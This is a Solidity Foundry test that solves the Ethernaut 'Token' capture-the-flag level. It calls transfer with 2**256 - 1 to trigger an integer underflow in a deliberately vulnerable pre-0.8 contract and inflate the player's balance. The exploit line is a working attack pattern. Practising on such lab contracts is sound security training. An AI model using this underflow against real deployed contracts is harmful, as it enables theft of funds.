// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {EthernautTest} from "./utils/EthernautTest-06.sol";
import {TokenFactory} from "../src/factories/TokenFactory.sol";
import {Token} from "../src/levels/Token.sol";

import "forge-std/console.sol";

contract TokenTest is EthernautTest {
    function setUp() public override {
        super.setUp();
        TokenFactory factory = new TokenFactory();
        ethernaut.registerLevel(factory);
        levelAddress = ethernaut.createLevelInstance(factory);
    }

    function testSolveToken() public {
        Token token = Token(payable(levelAddress));

        // [START]

        token.transfer(levelAddress, (2 ** 256) - 1);

        console.log("token.balanceOf(_player)", token.balanceOf(address(this)));

        // [END]

        assert(ethernaut.submitLevelInstance(payable(levelAddress)));
    }
}
